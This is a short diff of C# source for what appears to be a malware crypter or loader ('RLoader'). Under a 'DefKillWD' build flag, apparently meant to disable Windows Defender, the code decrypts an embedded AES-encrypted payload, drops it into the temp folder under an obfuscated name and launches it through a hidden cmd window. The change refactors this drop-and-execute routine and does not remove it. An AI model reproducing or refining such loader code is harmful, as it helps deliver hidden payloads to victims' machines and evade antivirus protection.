@@ -64,13 +64,12 @@ public partial class RLoader
         try
         {
 #if DefKillWD
-            string fn = Path.Combine(Path.GetTempPath(), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#DROPFILE"))));
-            File.WriteAllBytes(fn, RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")));
+            File.WriteAllBytes(Path.Combine(Path.GetTempPath(), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#DROPFILE")))), RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")));
             Process.Start(new ProcessStartInfo
             {
                 FileName = "cmd",
-                Arguments = "/c " + fn + " \"" + Assembly.GetEntryAssembly().Location + "\"",
-                WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                Arguments = "/c " + Path.Combine(Path.GetTempPath(), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#DROPFILE")))) + " \"" + Assembly.GetEntryAssembly().Location + "\"",
+                WorkingDirectory = Path.GetTempPath(),
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
             });
